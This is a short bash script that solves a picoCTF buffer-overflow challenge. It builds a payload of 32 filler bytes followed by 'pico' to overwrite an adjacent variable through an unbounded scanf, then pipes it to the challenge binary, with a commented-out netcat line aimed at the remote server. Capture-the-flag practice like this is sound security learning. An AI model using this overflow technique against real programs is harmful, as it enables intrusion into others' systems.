#!/bin/bash

# https://play.picoctf.org/practice/challenge/439

# The exploit is possible because of scanf
# scanf("%s", input_data); // unbounded, all user data will be written starting at input_data
# scanf("16%s", input_data); // only 16 bytes will be written

# buffer `safe_var` is 32 bytes away from buffer `input_data`
payload="$(printf 'A%.0s' {1..32})"
# buffer `safe_var` needs to be 'pico' to win
payload+="pico"

# echo -e "2 $payload 4" | nc "$SERVER" "$PORT"
echo -e "2 $payload 4" | ./chall
